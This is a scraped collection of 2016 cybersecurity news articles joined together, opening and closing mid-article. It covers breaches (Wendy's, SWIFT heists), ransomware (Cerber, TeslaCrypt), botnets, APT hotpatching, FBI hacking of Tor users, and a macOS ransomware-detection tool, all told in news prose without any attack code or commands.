The burger chain did not speculate how many people may have been affected, though it did confirm that the hackers were able to steal its customers' credit and debit card information. The data breach is more than three times bigger than initially thought. The original data breach was believed to have affected \"fewer than 300\" of its 5,144 franchised locations in the United States when the malware was discovered in May. The Malware had been installed on Point-of-Sale (PoS) systems in the affected restaurants and was able to obtain cardholder's name, payment card number, expiration date, service code, cardholder verification value, among other data. The data breach began in fall 2015 and discovered in February this year, and the company went public with in May. Just last month, Wendy's said the company learned of a second malware variant that had infected its systems and disabled it from all locations. The company is now offering one year of \"complimentary\" fraud protection services to affected customers. Wendy's has blamed a third-party for the cyber attack, saying a \"service provider\" had its remote access credentials compromised that allowed attackers to deploy malware remotely to some franchisees’ POS systems. Once identified, the US burger chain found a method of disabling the malware and has done so at all affected locations. Customers can see the list of affected locations through Wendy's website. So, if you have used your debit or credit card at Wendy's restaurant early this year, you are advised to keep a close eye on your bank account statements." }

Networking equipment vendor TP-LINK uses either tplinklogin.net or tplinkextender.net for its routers configuration. Although users can also access their router administration panel through local IP address (i.e. 192.168.1.1). The first domain offered by the company is used to configure TP-LINK routers and the second is used for TP-LINK Wi-Fi extenders. Here's the Blunder: TP-Link has reportedly \"forgotten\" to renew both domains that are used to configure its routers and access administrative panels of its devices. Both domains have now been re-registered using an anonymous registration service by an unknown entity and are being offered for sale online at US$2.5 Million each. This latest TP-Link oversight, which was first spotted by Cybermoon CEO Amitay Dan, could lead its users to potential problems. However, it seems like TP-Link is not at all interested in buying back those domains, as Dan claims that the hardware vendor is updating its manuals to remove the domain name references altogether. In recent years, the hardware vendor has started replacing its tplinklogin.net domain with tplinkwifi.net domain, which is currently under its control. So, there is no direct threat to TP-Link users. But unfortunately, the tplinklogin.net and tplinkextender.net usually came printed on the back of the devices. So, users accessing this domain on devices could end up on a domain under a third-party's control. If malicious actors get their hands on these domains, they could use them to distribute malware, serve phishing pages instructing users to \"download new firmware to your router,\" and request device or social media credentials from users before redirecting them to the router's local admin panel IP. The bottom line: Users are advised to avoid accessing their TP-Link routers using the tplinklogin.net domain; instead, use local IP address. Dan has also recommended Internet Service Providers (ISPs) to block the affected domain names in order to prevent its customers from being hijacked." }

Due to the insecure implementation, these Internet-connected embedded devices, including Smart TVs, Refrigerators, Microwaves, Set-top boxes, Security Cameras and printers, are routinely being hacked and used as weapons in cyber attacks. We have seen how hackers literally turned more than 100,000 Smart TVs and Refrigerator into the cyber weapon to send out millions of malicious spam emails for hacking campaigns; we have also seen how hackers abused printers and set-top-boxes to mine Bitcoins. And now… Cyber crooks are hacking CCTV cameras to form a massive botnet that can blow large websites off the Internet by launching Distributed Denial-of-service (DDoS) attacks. Researchers at Security firm Sucuri came across a botnet of over 25,000 CCTV cameras targeting business around the globe while defending a small jewelry shop against a DDoS attack. Also Read: Drones Can Find and Hack Internet-of-Things Devices From the Sky. The jewelry shop website was flooded with almost 35,000 HTTP requests per second due to which its website was unreachable to legitimate users. However, when Sucuri attempted to prevent the network flood by using a network addressing and routing system called Anycast, the botnet increased the number of HTTP requests on the store's website to more than 50,000 per second. The attack researchers were talking about was a massive Layer 7 DDoS attack that overwhelmed Web servers, occupying their resources and crashing websites. The DDoS attack continued for days, causing researchers curious about its origin. When they dug more, they discovered that the requests were coming from internet-connected CCTV cameras that had been remotely hijacked by cyber criminals to attack other services. \"It is not new that attackers have been using IoT devices to start their DDoS campaigns. However, we have not analyzed one that leveraged only CCTV devices and was still able to generate this quantity of requests for so long,\" said Sucuri CTO Daniel Cid. The IP addresses of CCTV boxes causing DDoS attack were coming from no fewer than 105 countries around the world. The Sucuri researchers noted a total of 25,513 unique IP addresses within few hours. Some of these addresses were IPv6. Also Read: Hacker-Friendly Search Engine that Lists Every Internet-Connected Device. This is not the first incident when hackers have hijacked CCTV cameras to launch DDoS attack against services. Late last year, Imperva's Incapsula team warned about a massive DDoS botnet of CCTV cameras running embedded versions of Linux and the BusyBox toolkit. Since the Internet of Things is rapidly growing and changing the way we use technology, it drastically expands the attack surface, and when viewed from the vantage point of information security, IoT can be frightening." }

Variants of Cerber Ransomware are now targeting MS Office 365 email users with a massive zero-day attack that has the ability to bypass Office 365's built-in security tools. According to a report published by cloud security provider Avanan, the massive zero-day Cerber ransomware attack targeted Microsoft Office 365 users with spam or phishing emails carrying malicious file attachments. The Cerber ransomware is invoked via Macros. Yes, it's hard to believe but even in 2016, a single MS Office document could compromise your system by enabling 'Macros'. Locky and Dridex ransomware malware also made use of the malicious Macros to hijack systems. Over $22 Million were pilfered from the UK banks with the Dridex Malware that got triggered via a nasty macro virus. You can see a screenshot of the malicious document in the latest malware campaign below, targeting Microsoft Office 365 users: While the security firm did not specify the exact number of users possibly hit by the ransomware, Microsoft reported in its first quarter 2016 that there are almost 18.2 Million Office 365 subscribers. \"While difficult to precisely measure how many users got infected,\" Avanan estimated that \"roughly 57 percent of organizations using Office 365 received at least one copy of the malware into one of their corporate mailboxes during the time of the attack.\" Although Cerber originally emerged in March, the malware campaign targeting Office 365 users began on June 22. However, Microsoft started blocking the malicious file attachment on June 23. The Cerber Ransomware not only encrypts user files and displays a ransom note, but also takes over the user's audio system to read out its ransom note informing them that their files were encrypted. The ransomware encrypts files with AES-256 encryption, asking victims to pay 1.24 Bitcoin (nearly US$810) for the decryption key. How to Protect Yourself from Cerber Ransomware In order to prevent yourself from the Cerber or any ransomware attack: Always keep your system and antivirus up-to-date. Regularly backup your files in an external hard-drive. Disable Macros in your MS Office programs. Always beware of phishing emails, spams, and clicking the malicious attachment. You can also use an Intrusion detection system (IDS), for which you can try AlienVault Unified Security Management (USM) that includes an inbuilt IDS with SIEM and real-time threat intelligence to help you quickly detect malware and other threats in your network.

Recent reports indicate that North Korean hackers have hacked into more than 140,000 computers of at least 160 South Korean government agencies and companies, and allegedly injected malware in the systems. The cyber attack was designed to lay for a long term period against its rival, authorities in Seoul said. The South Korean police were on high alert against cyberattacks by the North Korean hackers, especially after North Korea successfully tested a miniaturized hydrogen bomb in January and a long-range rocket launch in February, Reuters reports. According to the police, the hacking attack began in 2014 but was detected only in February this year, after North Korea managed to steal information from two companies: the SK and Hanjin Group. The documents stolen from the two companies included blueprints for the wings of F-15 fighter jets, an official at the South Korea cyber investigation unit confirmed. The investigation unit said, \"There is a high possibility that the North aimed to cause confusion on a national scale by launching a simultaneous attack after securing many targets of cyber terror, or intended to continuously steal industrial and military secrets.\" More than 42,000 materials were stolen in the hack, of which more than 40,000 materials were defense-related. Although a South Korean defense ministry official said that the stolen documents were not secret and that there wasn’t any security breach, a spokesperson from SK Holdings stated that 4 group affiliates were affected by the cyber attack. The cyber attack originated from an IP address traced down to the North Korea and was intended to target the network management software used by 160 companies and government agencies in South Korea. The police declined to identify the malicious software, though the IP address from where the hack was originated was identical to one used in a 2013 cyberattack against banks and TV broadcasters in South Korea. The South Korean police were then teamed up with companies and other government agencies to disable the malware and prevent the malicious code from further spreading, in what could lead to a massive cyber attack." }

How to hack a Facebook account? It is probably the biggest \"n00b\" question you will see on the Internet. The solution for this query is hard to find — but recently researchers have shown that how you can modify or alter your messages once you have pressed the SEND button in Facebook Messenger. According to the researcher Roman Zaikin from cyber security firm Check Point, a simple HTML tweak can be used to exploit Facebook online chat as well as its Messenger app, potentially allowing anyone to modify or delete any of his/her sent message, photo, file, and link. Though the bug is simple, it could be exploited by malicious users to send a legitimate link in a Facebook chat or group chat, and later change it to a malicious link that could lead to a malware installation, tricking victims into infecting their systems. Here’s How the Exploit Works: The exploit works on the way Facebook assigns identities to chat messages. Each chat message has a unique \"message_id\" identifier that could be revealed by sending a request to www.facebook.com/ajax/mercury/thread_info.php. Once message_id is identified, an attacker could alter its respective message content and send it back to Facebook servers which accept the new content as legitimate and push it back to the victim’s PC or mobile device. Video Demonstration: \"By exploiting this vulnerability, cyber criminals could change a whole chat thread without the victim realizing,\" said Oded Vanunu, Head of Products Vulnerability Research at Check Point. \"What’s worse. The hacker could implement automation techniques to continually outsmart security measures for long-term chat alterations. We applaud Facebook for such a rapid response and putting security first for their users.\" Researchers discovered the vulnerability earlier this month and notified Facebook about the flaw. The social networking giant promptly moved to fix the vulnerability, though Facebook explained that the flaw only affected its Messenger app on Android. \"Based on our investigation, this simple misconfiguration in the Messenger app on Android turned out to be a low-risk issue, and it's already been fixed,\" Facebook wrote in its blog post published Tuesday. Additionally, Facebook claims the vulnerability could not be exploited to infect its users' PCs with malicious software, as the company is using anti-spam and anti-virus filters to detect malware and spams." }

Researchers at the security firm FireEye Labs Advanced Reverse Engineering said on Thursday that the malware, dubbed \"IRONGATE,\" affects Siemens industrial control systems. The malware only works in a simulated environment and is probably just a proof-of-concept that is likely not used in wild; therefore is not yet advanced enough to impact real-world systems. The Irongate malware \"is not viable against operational Siemens control systems,\" the cybersecurity firm said in its blog post, and the malware \"does not exploit any vulnerabilities in Siemens products.\" The researchers found this malware fascinating due to its mode of operation that included some Stuxnet-like behavior. The Stuxnet sabotage malware was allegedly developed by the United States and Israel to disrupt Iran's nuclear facility and destroyed a several country's uranium enrichment centrifuges. Just like Stuxnet, Irongate uses a Man-in-the-Middle (MitM) technique to inject itself between the PLC (Programmable Logic Controller) and the legitimate software monitoring process, checks for defenses before detonating, as well as mask its tracks. Moreover, to achieve this MitM, like Stuxnet, Irongate replaces a valid Dynamic Link Library (DLL) file with a malicious copy, potentially allowing the malware to target a particular control system configuration. DLL is a small piece of code that can be used by different programs at the same time. However, the researchers note that Irongate doesn't compare to Stuxnet in terms of complexity, ability to propagate, or geopolitical implications. Moreover, Irongate differs from Stuxnet in the way it avoids detection. While Stuxnet only looked for the presence of various antivirus software on the target systems, Irongate looks for sandbox environments such as VMWare and Cuckoo Sandbox. FireEye says the firm detected several versions of Irongate on malware database VirusTotal in the second half of 2015, but researchers managed to track down two malware samples to September 2014. The research team doesn't think that Irongate is written by the Stuxnet’s authors, as Irongate is not the type of sophistication one would expect from a nation state. FireEye says Irongate could be a proof-of-concept, a research project, or just a test, which is why the firm went public with the details in order to find out more about the malware sample. But the question still remains: Who did write Irongate?" }

The attack on Banco del Austro (BDA) in Ecuador occurred in January 2015 and, revealed via a lawsuit filed by BDA against Wells Fargo, a San Francisco-based bank on Jan. 28, Reuters reported. Here’s how cyber criminals target banks: Uses malware to circumvent local security systems of a bank. Gains access to the SWIFT messaging network. Sends fraudulent messages via SWIFT to initiate cash transfers from accounts at larger banks. Over ten days, hackers used SWIFT credentials of a bank employee to modify transaction details for at least 12 transfers amounting to over $12 Million, which was transferred to accounts in Hong Kong, Dubai, New York and Los Angeles. In the lawsuit, BDA holds Wells Fargo responsible for not spotting the fraudulent transactions and has demanded Wells Fargo to return the full amount that was stolen from the bank. The lawsuit filed by BDA in a New York federal court described that the some of these attacks could have been prevented if banks would have shared more details about the attacks with the SWIFT organization. Wells Fargo has also fired back and blamed BDA's information security policies and procedures for the heist and noted that it \"properly processed the wire instructions received via authenticated SWIFT messages,\" according to court documents. According to reports, the heist remained a secret for a long time and now disclosed when BDA decided to sue Wells Fargo that approved the fraudulent transfers. SWIFT did not have any idea about the breach, as neither BDA nor Wells Fargo shared any detail about the attack. \"We were not aware,\" SWIFT said in a statement. \"We need to be informed by customers of such frauds if they relate to our products and services so that we can inform and support the wider community. We have been in touch with the bank concerned to get more information, and are reminding customers of their obligations to share such information with us.\" It turns out that the security of SWIFT itself was not breached in the attack, but cyber criminals used advanced malware to steal credentials of bank’s employees and cover their tracks. In February, $81 Million cyberheist at the Bangladesh central bank was carried out by hacking into SWIFT using a piece of malware that manipulated logs and erased the fraudulent transactions history, and even prevented printers from printing those transactions." }

Now, you can decrypt all your important files that have been encrypted by TeslaCrypt ransomware. So, stop Googling about How to decrypt TeslaCrypt Ransomware encrypted files, as the malware authors themselves provided the solution to your problem. Since its launch in March last year, TeslaCrypt computer virus has been used in massive malvertising attacks. The ransomware, which often targets PC gamers, locks up files until a ransom is paid, usually $500 in Bitcoin. Infection generally comes through corrupted websites, malvertising or phishing emails. In a surprising move in the malware's story, the cybercriminals behind the nefarious TeslaCrypt ransomware have apparently shut down their operations and released a master key to the public that can unlock all encrypted files on PCs infected by the latest versions of TeslaCrypt. The icing on the cake is that the universal decryption key is free, so victims can decrypt their files without paying a single penny. Here’s what one of the developers of TeslaCrypt posted on the TeslaCrypt Dark Website: \"Project closed! Master key for decrypt: 440A241DD80FCC5664E861989DB716E08CE627D8D40C7EA360AE855C727A49EE. Wait for other people make universal decrypt software. We are sorry!\" The above note was prompted by a query from an ESET security researcher, who had noticed the successive downfall of TeslaCrypt and asked the authors for a decryption key. The authors offered a free master key in an entirely surprising move and ESET quickly created a Free Ransomware Decryptor tool for TeslaCrypt, which is available for download from the ESET website. How to Use Master Ransomware Decryption Key Using the master key, security researcher has created a decryptor tool that is available for download, with detailed instructions, from the ESET website. Bleeping Computer has also released another TeslaCrypt ransomware decryptor tool, dubbed TeslaDecoder, with a much easy-to-use interface." }

Lovecruft is a well-known cryptographer and lead software developer for Tor project from many years. She has worked for a variety of other security and encryption products, such as Open Whisper Systems and the LEAP Encryption Access Project. Since November 2015, the FBI special agents in the United States have been trying to meet with her, but they will not tell her or her lawyer exactly why. When her lawyer reached out the FBI Special Agent Mark Burnett and asked why he wanted to meet with her, the agent assured the lawyer that she is not the target of any investigation, but also said that… Also Read: Mozilla asks Court to disclose Firefox Exploit used by FBI to hack Tor users. The FBI have their agents on the streets in 5 cities in the United States hunting for her, intending to simply ask her some questions without her lawyer's presence. Lovecruft's lawyer responded by saying that all questions should be directed to him rather than to Lovecruft or her family, but Burnett said that he will not tell her or her lawyer what this involves. In general, it's not a big deal to have at least a meeting with the FBI agents to know what exactly are the federal agents looking for. But Lovecruft fears that the federal agents will serve her with some kind of secret warrant, possibly to get her to insert a backdoor in the TOR system and expose TOR users around the world to potential spying. Must Read: Former Tor Developer Created Malware for FBI to Unmask Tor Users. So, she packed her suitcase and left the United States for Germany on December 7 last year, accusing the FBI of harassment for the past 6 months. \"I had already been in the process of moving, permanently, to Germany, and had retained a German immigrations lawyer several months prior to these events,\" Lovecruft wrote in her blog post titled, 'FBI Harassment.' Although unsure if she was breaking any laws by leaving the country, she booked a flight to Berlin – despite the fact that she didn't intend to use the return ticket – just to avoid raising suspicions. However, this didn't end the matter, and the FBI Special Agent Kelvin Porter in Atlanta called Lovecruft's lawyer last month, asking him where to send a subpoena for Lovecruft to help testify in a criminal hacking case. Also Read: Judge Ordered the FBI to Reveal the Source Code of its Tor Hacking Exploit. Following the Lovecruft's blog post, the Tor Project official Twitter tweeted out in support of their developer, saying \"We support our colleague Isis.\" In response to this issue, an FBI spokesperson told IBTimes: \"The FBI, as a general policy, does not confirm nor deny investigations, nor comment on the investigative activity unless it is a matter of public record. If someone is alleging harassment of any kind that should be brought to the attention of the government, though it is unclear what specific activity is even being characterized as harassment.\" TOR is an anonymity software that provides a safe haven to human rights activists, government, journalists but also is a place where drugs, child pornography, assassins for hire and other illegal activities has allegedly been traded. Since last few years, the FBI has been trying to break TOR and unmask TOR users identity in several investigations. The agency has accused of hacking TOR users in an investigation of the world’s largest dark web child pornography site 'Playpen.' The FBI has also compelled Carnegie Mellon University to help them hack TOR users." }

Security researchers from Romania-based security firm Bitdefender revealed the presence of this massive click-fraud botnet, which the researchers named Million-Machine Campaign. For those unaware, Botnets are networks of computers infected with malware designed to take control of the infected system without the owner's knowledge, potentially being used for launching distributed denial-of-service (DDoS) attacks against websites. The malware in question is known as Redirector.Paco that alone has infected over 900,000 machines around the world since its release in 2014. The Redirector.Paco Trojan infects users when they download and install tainted versions of popular software programs, such as WinRAR, YouTube Downloader, KMSPico, Connectify, or Stardock Start8. Once infected, Paco modifies the computer's local registry keys and adds two new entries disguised as \"Adobe Flash Update\" and \"Adobe Flash Scheduler,\" to make sure the malware starts after every computer boot-up process. Besides this, the malware drops JavaScript files that downloads and implements a PAC (Proxy Auto Configuration) file that hijacks all Web traffic, ensuring traffic routes through an attacker-controlled server. Search Engine Display Fake Results even Over HTTPS Paco then sniffs all Web traffic originating from the infected computer and looks for queries made over popular search engines like Google, Bing, or Yahoo! and replace the actual results with fake Web pages, mimicking their real User Interface. The botnet has the ability to redirect search engine results even when the results are served over encrypted HTTPS connections. To do so, the malware uses a free root certificate ‒ DO_NOT_TRUST_FiddlerRoot ‒ that avoid your browser showing HTTPS errors. \"The goal is to help cyber-criminals earn money from the AdSense program,\" Bitdefender's Alexandra Gheorghe said in a blog post. \"Google's AdSense for Search program places contextually relevant ads on Custom Search Engine's search results pages and shares a portion of its advertising revenue with AdSense partners.\" Although the malware tries to make the search results look authentic, some markers can raise suspicions, like messages showing \"Waiting for proxy tunnel\" or \"Downloading proxy script\" in the status bar of your web browser. Additionally, the search engine takes longer than usual to load results, and the typical yellow 'O' characters in Google above the page numbers are not displayed, according to researchers. The security firm says that majority of victims are from India, Malaysia, Greece, the United States, Italy, Pakistan, Brazil, and Algeria. However, to avoid these kinds of cyber threats, following standard security measures could save your ass, such as keep your system and antivirus up-to-date, and always keep an eye on warning that says something is not right with your computer." }

Guess what could be the next target of ransomware malware? Everything that is connected to the Internet. There is a huge range of potential targets, from the pacemaker to cars to Internet of the Things, that may provide an opportunity for cybercriminals to launch ransomware attacks. Recently, the American public utility Lansing Board of Water & Light (BWL) has announced that the company has become a victim of Ransomware attack that knocked the utility's internal computer systems offline. Also Read: FBI Suggests Ransomware Victims — 'Just Pay the Ransom'. The attack took place earlier this week when one of the company’s employees opened a malicious email attachment. Once clicked, the malware installed on the computer and quickly began encrypting the organization's files, according to the Lansing State Journal. BWL quickly decided to shut down its networks and suspend some services, including accounting and email service for its about 250 employees, in order to prevent further damages. Power and water shut-offs by BWL was also suspended. Though the ransomware type is still unknown, the utility is currently working with the Federal Bureau of Investigation (FBI) and local law enforcement authorities to investigate the incident. The company assured its 96,000 customers that no personal information related to its customers or employees has been compromised by the ransomware intrusion into the corporate computer network. However, it is not yet clear whether the utility paid the Ransom in exchange of its data. The company said law enforcement has limited it from discussing the issue in public, at least for now." }

Under the original Rule 41, let’s say, a New York judge can only authorize the FBI to hack into a suspect's computer in New York. But the amended rule would now make it easier for the FBI to hack into any computer or network, literally anywhere in the world. The Federal Bureau of Investigation (FBI) can now Hack your computers anywhere, anytime. The FBI appeared to have been granted powers to hack any computer legally across the country, and perhaps anywhere in the world, with just a single search warrant authorized by any United States judge. The U.S. Supreme Court approved yesterday a change in Rule 41 of the Federal Rules of Criminal Procedure that would let U.S. judges issue warrants for remote access to electronic devices outside their jurisdiction. \"These amendments will have significant consequences for Americans' privacy and the scope of the government's powers to conduct remote surveillance and searches of electronic devices,\" Democratic Senator Ron Wyden of Oregon said in a statement Thursday. \"Under the proposed rules, the government would now be able to obtain a single warrant to access and search thousands or millions of computers at once; and the vast majority of the affected computers would belong to the victims, not the perpetrators, of cybercrime.\" If Congress doesn't act, the changes to the Rule 41 will take immediate effect in December despite opposition from technology giants and civil liberties groups who believes the changes would expand the FBI's power to conduct mass hacks on computer networks. The tech giants and civil liberties groups like the American Civil Liberties Union (ACLU) say the change also could run afoul of the American Constitution's protections against inappropriate searches and seizures. However, while proposing the rule change in 2014, the U.S. Department of Justice described it as a small modification required to modernize the criminal code for the digital age, saying the changes wouldn't permit searches that aren't already legal. The FBI Now Can Legally Hack TOR Users Previously, under the Rule 41, magistrate judges could not approve search warrants to remotely hack or access computers outside their jurisdiction. But with the rule change, magistrate judges could now issue orders to search or seize computers and electronic devices outside their local authority if the target's location is unknown or if the target is using anonymity software like TOR. More than a Million of Internet users make use of TOR anonymity software to browse the Web just to hide their actual identity for entirely legitimate reasons, in addition to criminals who use TOR to hide their locations. Recently, the court threw out evidence that the FBI brought by hacking the members of the child pornography site PlayPen on the TOR network using its so-called Network Investigative Technique (NIT), explaining the feds violated Rule 41's territorial restrictions. This rule change would prevent something like that from happening, opening doors for the FBI to legally hack any computer in any country. The Congress has time until 1 December 2016 to reject changes or make more changes to Rule 41, after which the amended version of the rule will take effect." }

Former Tor Developer Created Malware for FBI to Hack Tor Users Do you know who created malware for the FBI that allowed Feds to unmask Tor users? It's an insider's job… A former Tor Project developer. According to an investigation, Matthew J. Edman, a cyber security expert and former employee of the Tor Project, helped the FBI with Cornhusker a.k.a Torsploit malware to hack Tor users in several high-profile cases, including Operation Torpedo and Silk Road. The Malware exploited vulnerabilities in Adobe Flash Player to reveal Tor users' actual IP address to an FBI servers outside the Tor network.

The suspect, Francis Rawls, who is a former Philadelphia Police Department sergeant, has yet not been charged with any child pornography crime because the required evidence is locked in his hard drives using Apple's FileVault encryption software. Rawls failed to comply with the court order, as the passwords he entered in the initial days of the investigation didn't decrypt his hard drives, and was then taken into indefinite imprisonment by US Marshals on Sept. 30, 2015.

Do you know who created malware for the FBI that allowed Feds to unmask Tor users? It's an insider's job… A former Tor Project developer. In an investigation conducted by Daily Dot journalists, it turns out that Matthew J. Edman, a former part-time employee of Tor Project, created malware for the Federal Bureau of Investigation (FBI) that has been used by US law enforcement and intelligence agencies in several investigations, including Operation Torpedo. Matthew Edman is a computer scientist who specializes in cyber security and investigations and joined the Tor Project in 2008 to build and enhance Tor software's interactions with Vidalia software, cross-platform GUI for controlling Tor. After 2009, Matthew was hired by a contractor working for defense and intelligence agencies, including the FBI, to develop an anti-Tor malware. The Tor Project has also confirmed the same, saying, \"It has come to our attention that Matt Edman, who worked with the Tor Project until 2009, subsequently was employed by a defense contractor working for the FBI to develop anti-Tor malware.\" Moreover, the team said Edman worked only on the Vidalia project that Tor dropped in 2013 and replaced it with other tools designed to improve the user experience. Also Read: How Hacking Team and FBI planned to Unmask A Tor User. Cases Solved with the Help of Former Tor Developer Since 2012, Edman has been working at Mitre Corporation as a senior cyber security engineer assigned to the FBI's internal team, dubbed Remote Operations Unit, that develops or purchases exploits and hacking tools for spying on potential targets. Due to his work for the Tor Project, Edman became an FBI contractor assigned a task to hack Tor as part of Operation Torpedo, a sting operation to identify owners and patrons of Dark Net child pornography websites that used Tor. Also Read: How Spies Could Unmask Tor Users without Cracking Encryption. Besides working on Operation Torpedo, Edman also helped the federal agency shut down Silk Road, the first most popular DarkNet drug marketplace, and arrest its convicted creator Ross Ulbricht. According to testimony, it was Edman who did almost everything from tracking $13.4 Million in Bitcoins from Silk Road to tracing Ulbricht's laptop, which played a significant role in Ulbricht being convicted and sentenced to the life term in prison. Cornhusker/Torsploit Malware to Unmask Tor Users To unmask Tor users, Edman worked closely with FBI Special Agent Steven A. Smith to develop and deploy malware, dubbed \"Cornhusker\" or \"Torsploit,\" that collect identifying information on Tor users. Tor is an anonymity software used by millions of people, including government officials, human rights activists, journalists and, of course, criminals around the world to keep their identity hidden while surfing the Internet. This is why, the Tor software is used by people to visit Dark Net websites, like child pornography sites, which are inaccessible via standard web browsers. The Cornhusker malware exploited vulnerabilities in Adobe Flash Player to reveal Tor users' actual IP address to an FBI servers outside the Tor network. Also Read: FBI paid $1 Million to University Researchers for Unmasking Tor Users. The agency hijacked and placed Cornhusker on three servers that ran multiple anonymous child pornography websites. The malware then targeted the flaws in Flash inside the Tor Browser. Adobe Flash Player has long been considered as unsafe by many security experts, and the Tor Project has long warned against using it. However, many people, including the dozens revealed in Operation Torpedo, make use of Flash inside their Tor Browser. Though, according to court documents, Cornhusker is no longer in use, the FBI is using its own funded \"Network Investigative Technique\" (NIT) to obtain IP and MAC addresses of Tor users in the course of investigations. However, the so-called network investigative technique has been considered as invalid by the court during a hearing on the burst of the world’s largest dark web child pornography site, PlayPen. On Monday, the opposition lawyers have filed a motion against the FBI to reveal the full source code of the malware it used to hack suspected visitors of PlayPen, or simply drop the case." }

PLATINUM group has been active since 2009 and launching large-scale attacks against governmental organizations, intelligence agencies, defense institutes and telecommunication providers in South and Southeast Asia. Practically speaking, the most important thing for a sophisticated APT hacker and a cyber-espionage group is to remain undetected for the longest possible period. Well, that's exactly what an APT (Advanced Persistent Threat) group has achieved. The Microsoft’s Windows Defender Advanced Threat Hunting team has discovered that an APT group, dubbed Platinum, has been spying on high-profile targets by abusing a \"novel\" technique called Hotpatching. Introduced in Windows Server 2003, the Hotpatching feature allows Microsoft to upgrade applications or the operating system in the running system without having to reboot the computer by inserting the new, updated code into a server. The Platinum hacking group has often used the spear-phishing technique to penetrate initially the targeted networks, used numerous zero-day vulnerabilities in attacks, and has taken many efforts to hide its attacks. The latest report released by Microsoft said the Platinum group abused the Windows’ hotpatching feature, allowing it to inject malicious code into running processes without having to reboot the server and then later hide backdoors and other malware from installed antivirus solution. \"If the tool fails to inject code using hot patching, it reverts to attempting the other more common code injection techniques into common Windows processes, primarily targeting winlogon.exe, lsass.exe, and svchost.exe,\" Microsoft said in its report. The hotpatching technique works against Windows Server 2003 Service Pack 1, Windows Server 2008, Windows Server 2008 R2, Windows Vista, and Windows 7. Platinum abused the technique in real-world attacks to hide its efforts from analysis. The group has been using the Hotpatching technique to install the Dipsing, Adbupd and JPIN backdoors on networks belonging to governmental organizations, including defense organizations, intelligence agencies, diplomats and Internet Service Providers (ISPs) and then to steal sensitive data. The goal of the attacks doesn’t appear to have been immediate financial gain; rather the Platinum APT group is up to a broader economic espionage campaign using stolen information. The group has been targeting countries in South and Southeast Asia since at least 2009, with Malaysia being its biggest victim, following Indonesia, China, and India. Though the Platinum group is still active, there is still a way for organizations and companies to avoid infection. Microsoft's security experts explain that the hotpatching technique requires admin-level permissions, so the threat actors are sending spear-phishing emails that come with boobytrapped Office documents to infect each target." }

The hackers used a custom-made malware to hide evidence and go undetected by erasing records of illicit transfers with the help of compromised SWIFT system. The Bangladesh Bank hackers, who managed to steal $81 Million from the bank last month in one of the largest bank heists in history, actually made their tracks clear after hacking into SWIFT, the heart of the global financial system. SWIFT, stands for the Society for Worldwide Interbank Financial Telecommunications, is a global messaging network used for most international money and security transfers. More than 11,000 Global Banks on HIGH ALERT! Nearly 11,000 Banks and other financial institutions around the World use SWIFT system to send securely and receive payment instructions through a standardized system of codes. Recently, Bangladesh police investigators uncovered evidence revealing that the Bank was using second-hand $10 network switches without a Firewall to run its network, which offered hackers access to the bank’s entire infrastructure, including the SWIFT servers. Now, researchers from British defense contractor BAE Systems reported Monday that the Bangladesh Bank hackers used a piece of sophisticated, custom-made malware to manipulate logs and erase the history of the fraudulent transactions, which even prevent printers from printing the fraudulent transactions. The malware also has the capability to intercept and destroy incoming messages confirming the money transfers. These malware capabilities prevented hackers to remain undetected. \"This malware appears to be just part of a wider attack toolkit and would have been used to cover the attackers' tracks as they sent forged payment instructions to make the transfers,\" security researcher Sergei Shevchenko wrote in a blog post. When and How Did They Get Detected? The hackers had attempted to steal $951 Million in total from Bangladesh central bank account at the Federal Reserve Bank of New York using fraudulent transactions, but a simple typo (spell error) by hackers halted the further transfers of the $850 Million funds. The BAE researchers believe the malware used to target Alliance Access, a piece of software that allows banks to connect to the SWIFT network. According to SWIFT's official website, Alliance Access has more than 2,000 installations worldwide. So even though the SWIFT financial system is used by around 11,000 banks and financial institutions, all of them are not affected by the notorious malware. \"By modifying the local instance of SWIFT Alliance Access software, the malware grants itself the ability to execute database transactions within the victim network,\" Shevchenko said. SWIFT To Issue Emergency Security Update Meanwhile, Brussels-based SWIFT confirmed to Reuters that the company was aware of the nasty malware used to target its client software and that it would roll out a security software update on Monday to fix the issue, along with a special warning to financial institutions. SWIFT Spokeswoman Natasha Deteran said the software update was intended \"to assist customers in enhancing their security and to spot inconsistencies in their local database records.\"" }

Panin, a 27-year-old Russian programmer also known by the aliases 'Gribodemon' and 'Harderman,' was sentenced by the court to nine years, six months in prison for developing SpyEye as a successor to Zeus. In 2010, Panin allegedly received the source code and rights to sell Zeus from Evginy Bogachev, aka Slavik, and incorporated many components of it into SpyEye. Bogachev, who is currently the FBI's most wanted hacker, remains at large. Panin's associate Bendelladj, a 27-year-old Algerian national also known by the hacker alias as 'Bx1' and 'Happy Hacker,' who hacked 217 banks, donated more than $280 Million to Palestinian charities. He got a sentence of 15-year in prison for marketing and advertising the SpyEye malware on various online forums. Bendelladj sold versions of SpyEye to almost 150 clients for prices ranging from $1,000 to $8,500 and one of his customers, 'Soldier,' had reported having made over $3.2 Million in just six months using the virus. The Department of Justice (DoJ) has described SpyEye as a \"preeminent malware banking Trojan,\" which was used to infect over 50 million computers worldwide from 2010 to 2012, causing nearly $1 Billion in financial losses to individuals and financial institutions globally. Bendelladj was arrested in Thailand in January 2013 and extradited to the United States at the same year while Panin was detained in July 2013 while he was flying through Hartsfield-Jackson Atlanta International Airport." }

This ransomware detection tool helps to block the suspicious processes and waits for the user to decide whether to allow or stop the process. Ransomware has risen dramatically since last few years... so rapidly that it might have already hit someone you know. With hundred of thousands of ransomware samples emerging every day, it is quite difficult for traditional signature-based antivirus products to keep their signature database up-to-date. So, if signature-based techniques are not enough to detect ransomware infection, then what else can we do? Some Antivirus companies have already upgraded their security solutions that detect suspicious behaviors like the sequential accessing of a large number of files, using encryption algorithms and key exchange mechanisms. Here’s the latest ransomware detection tool for Mac OS X users: RansomWhere? – a smart application that can identify ransomware-like behavior by detecting untrusted processes rapidly encrypting files, stop that suspicious process, and then alert the user. How RansomWhere tool works Patrick Wardle, a former NSA staffer who now leads research at bug hunting outfit Synack, has developed the RansomWhere tool, which aims at detecting and blocking generic ransomware on Mac OS X by regularly monitoring the user's local filesystem for the creation of encrypted files by any process. \"The ransomware will likely encrypt a few files (ideally only two or three), before being detected and blocked,\" Wardle wrote in a blog post. This ransomware detection tool, by default, scans Mac apps and binaries that are signed with an Apple Developer ID and not by official Apple certificates. If the tool detects any untrusted process, it suspends the suspicious process and alerts the user by showing a pop-up asking user to continue or terminate the process in question. Wardle successfully tested RansomWhere against KeRanger as well as Gopher ransomware proof-of-concept, which was developed by a pro-Apple Mac hacker, Pedro Vilaca, last year. Also Read: How Just Opening an MS Word Doc Can Hijack Every File On Your System. Though Wardle 